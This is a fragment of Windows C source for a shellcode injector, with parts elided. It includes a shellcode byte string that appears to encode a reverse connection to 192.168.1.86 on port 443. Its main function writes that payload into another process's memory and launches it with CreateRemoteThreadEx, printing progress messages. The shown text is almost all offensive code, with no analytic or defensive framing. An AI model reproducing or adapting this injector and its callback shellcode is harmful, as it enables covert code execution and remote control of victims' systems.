...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\x56\x41\x54"
...
int main(int argc, char* argv[])
{
	...
	printf("%s Has written %zu-bytes to process memory\n", k, sizeof(crowPuke));

	/* create thread to run our payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dTID);

	if (hThread == NULL)
	{
		printf("%s failed to get handle to the thread, error: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s got a handle to the thread (%ld)\n\\--0x%p\n",k , dTID, hThread);

	printf("%s Waiting on thread to finish\n", k);
